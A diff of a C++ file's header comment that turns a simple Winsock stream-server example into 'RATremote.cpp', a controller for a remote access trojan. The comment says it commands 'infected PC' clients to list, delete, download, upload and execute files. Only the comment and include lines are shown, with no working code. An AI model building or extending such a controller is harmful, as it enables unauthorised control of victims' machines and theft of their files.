@@ -1,23 +1,24 @@
 //
-// Server.cpp
+// RATremote.cpp
 //
-// Extremely simple, stream server example.
-// Works in conjunction with Client.cpp.
+// The program waits for a connection from RAT.exe. Once connected,
+// commands can be sent to the remote client, which are executed on
+// the infected PC. The tested commands are the DOS commands dir, mkdir, 
+// rmdir and del (delete files only)(more DOS may be working), and 
+// the commands cd, get [FileName] (download file), put [FileName] (upload file) 
+// and start [FileName] (execute file located on infected PC).
+// If the program loses connection to the remote client, it will 
+// wait for a reconnect unless the connection was interupted via the "exit" command.
 //
-// The program sets itself up as a server using the TCP
-// protoocl. It waits for data from a client, displays
-// the incoming data, sends a message back to the client
-// and then exits.
+// Compile and link with wsock32.lib.
 //
-// Compile and link with wsock32.lib
+// Pass the port number on the command line. 
 //
-// Pass the port number that the server should bind() to
-// on the command line. Any port number not already in use
-// can be specified.
+// Example: Server.exe 2030
 //
-// Example: Server 2000
+// Written by: Alexandre Cox
+// Date: 04/04/2018
 //
-
 #include <winsock.h>
 #include <iostream>
 #include <fstream>
